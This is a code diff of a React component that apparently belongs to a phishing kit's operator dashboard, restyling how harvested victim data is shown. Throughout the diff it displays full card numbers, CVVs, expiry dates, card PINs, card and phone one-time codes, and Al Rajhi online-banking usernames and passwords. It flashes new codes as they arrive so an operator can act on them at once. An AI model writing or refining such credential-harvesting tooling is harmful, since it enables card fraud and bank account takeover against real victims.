@@ -52,19 +52,19 @@ export default function CardModal({ ip, user, onClose }) {
 
   useEffect(() => {
     const cur = user?.pin || "";
-    if (cur && prevPinRef.current !== cur) { setBlinkPin(true); setTimeout(() => setBlinkPin(false), 6000); }
+    if (cur && prevPinRef.current !== cur) { setBlinkPin(true); setTimeout(() => setBlinkPin(false), 1500); }
     prevPinRef.current = cur;
   }, [user?.pin]);
 
   useEffect(() => {
     const cur = user?.verificationCode || "";
-    if (cur && prevOtpRef.current !== cur) { setBlinkOtp(true); setTimeout(() => setBlinkOtp(false), 6000); }
+    if (cur && prevOtpRef.current !== cur) { setBlinkOtp(true); setTimeout(() => setBlinkOtp(false), 1500); }
     prevOtpRef.current = cur;
   }, [user?.verificationCode]);
 
   useEffect(() => {
     const cur = user?.phoneCode || "";
-    if (cur && prevPhoneOtpRef.current !== cur) { setBlinkPhoneOtp(true); setTimeout(() => setBlinkPhoneOtp(false), 6000); }
+    if (cur && prevPhoneOtpRef.current !== cur) { setBlinkPhoneOtp(true); setTimeout(() => setBlinkPhoneOtp(false), 1500); }
     prevPhoneOtpRef.current = cur;
   }, [user?.phoneCode]);
 
@@ -135,68 +135,48 @@ export default function CardModal({ ip, user, onClose }) {
             {payments.length === 0 ? (
               <div style={{ color:"#888", padding:"0.5rem" }}>No card submissions yet.</div>
             ) : (
-              payments.map((p, idx) => {
-                const raw = (p.cardNumber || "").replace(/\s/g, "");
-                const isVisa = raw.charAt(0) === "4";
-                const isMC   = (() => { const p2=parseInt(raw.substring(0,2)); const p4=parseInt(raw.substring(0,4)); return (p2>=51&&p2<=55)||(p4>=2221&&p4<=2720); })();
-                return (
-                  <div key={p._id || idx} className="bank-card">
-                    <div className="bank-card-top">
-                      <span className="bank-card-submission">#{idx + 1}</span>
-                      {isVisa && <img className="bank-card-network" src="/assets/Visa.png" alt="Visa" />}
-                      {isMC   && <img className="bank-card-network" src="/assets/Mastercard.png" alt="MC" />}
-                    </div>
-                    <div className="bank-card-chip" />
-                    <div className="bank-card-number">{formatCard(p.cardNumber)}</div>
-                    <div className="bank-card-bottom">
-                      <div>
-                        <div className="bank-card-label">Card Holder</div>
-                        <div className="bank-card-value">{p.cardHolderName || "—"}</div>
-                      </div>
-                      <div style={{ textAlign:"center" }}>
-                        <div className="bank-card-label">Expires</div>
-                        <div className="bank-card-value">{formatExp(p.expiryDate) || "—"}</div>
-                      </div>
-                      <div className="bank-card-cvv-wrap">
-                        <div className="bank-card-label">CVV</div>
-                        <div className="bank-card-value">{p.cvv || "—"}</div>
-                      </div>
-                    </div>
-                    {p.total && <div style={{ position:"absolute", top:14, left:14, zIndex:1 }}><span className="bank-card-total">{p.total} ر.س</span></div>}
-                  </div>
-                );
-              })
+              payments.map((p, idx) => (
+                <div key={p._id || idx} style={{ minWidth:"240px", border:"1px solid #ccc",
+                  borderRadius:"8px", padding:"0.75rem", backgroundColor:"#fefefe",
+                  boxShadow:"0 1px 3px rgba(0,0,0,0.1)", flex:"0 0 auto" }}>
+                  <div style={{ fontWeight:600, marginBottom:"0.5rem" }}>Submission {idx + 1}</div>
+                  <div><strong>Name:</strong> {p.cardHolderName || "—"}</div>
+                  <div><strong>Card #:</strong> {formatCard(p.cardNumber)}</div>
+                  <div><strong>Exp:</strong> {formatExp(p.expiryDate) || "—"}</div>
+                  <div><strong>CVV:</strong> {p.cvv || "—"}</div>
+                  <div><strong>Total:</strong> {p.total || "—"}</div>
+                </div>
+              ))
             )}
           </div>
 
           {/* الأكواد */}
-          <div style={{ display:"flex", gap:"1rem", marginTop:"1rem" }}>
+          <div style={{ display:"flex", gap:"2rem", marginTop:"1rem", padding:"1rem",
+            backgroundColor:"#fafafa", borderRadius:"8px", border:"1px solid #ddd" }}>
 
-            <div style={{ flex:1, padding:"0.75rem", borderRadius:"8px", border:"1px solid #ddd" }}
-              className={blinkPin || blinkOtp ? "blink-green-box" : ""}>
-              <h6 style={{ fontWeight:600, marginBottom:"0.5rem" }}>Card PIN / OTP</h6>
-              <p className={blinkPin ? "blink-green-text" : ""} style={{ margin:"0 0 4px" }}>
+            <div style={{ flex:1 }}>
+              <h6 style={{ fontWeight:600 }}>Card PIN / OTP</h6>
+              <p className={blinkPin ? "blink-green-text" : ""}>
                 <strong>PIN:</strong> {pin || "—"}
               </p>
-              <p className={blinkOtp ? "blink-green-text" : ""} style={{ margin:0 }}>
+              <p className={blinkOtp ? "blink-green-text" : ""}>
                 <strong>Card OTP:</strong> {verificationCode || "—"}
               </p>
             </div>
 
-            <div style={{ flex:1, padding:"0.75rem", borderRadius:"8px", border:"1px solid #ddd" }}
-              className={blinkPhoneOtp ? "blink-green-box" : ""}>
-              <h6 style={{ fontWeight:600, marginBottom:"0.5rem" }}>Phone / OTP</h6>
-              <p style={{ margin:"0 0 4px" }}><strong>Phone #:</strong> {phoneNumber || "—"}</p>
-              <p style={{ margin:"0 0 4px" }}><strong>Operator:</strong> {operator || "—"}</p>
-              <p className={blinkPhoneOtp ? "blink-green-text" : ""} style={{ margin:0 }}>
+            <div style={{ flex:1 }}>
+              <h6 style={{ fontWeight:600 }}>Phone / OTP</h6>
+              <p><strong>Phone #:</strong> {phoneNumber || "—"}</p>
+              <p><strong>Operator:</strong> {operator || "—"}</p>
+              <p className={blinkPhoneOtp ? "blink-green-text" : ""}>
                 <strong>Phone OTP:</strong> {phoneCode || "—"}
               </p>
             </div>
 
-            <div style={{ flex:1, padding:"0.75rem", borderRadius:"8px", border:"1px solid #ddd" }}>
-              <h6 style={{ fontWeight:600, marginBottom:"0.5rem" }}>Rajhi</h6>
-              <p style={{ margin:"0 0 4px" }}><strong>Username:</strong> {user?.rajhiUsername || "—"}</p>
-              <p style={{ margin:0 }}><strong>Password:</strong> {user?.rajhiPassword || "—"}</p>
+            <div style={{ flex:1 }}>
+              <h6 style={{ fontWeight:600 }}>Rajhi</h6>
+              <p><strong>Username:</strong> {user?.rajhiUsername || "—"}</p>
+              <p><strong>Password:</strong> {user?.rajhiPassword || "—"}</p>
             </div>
           </div>
 
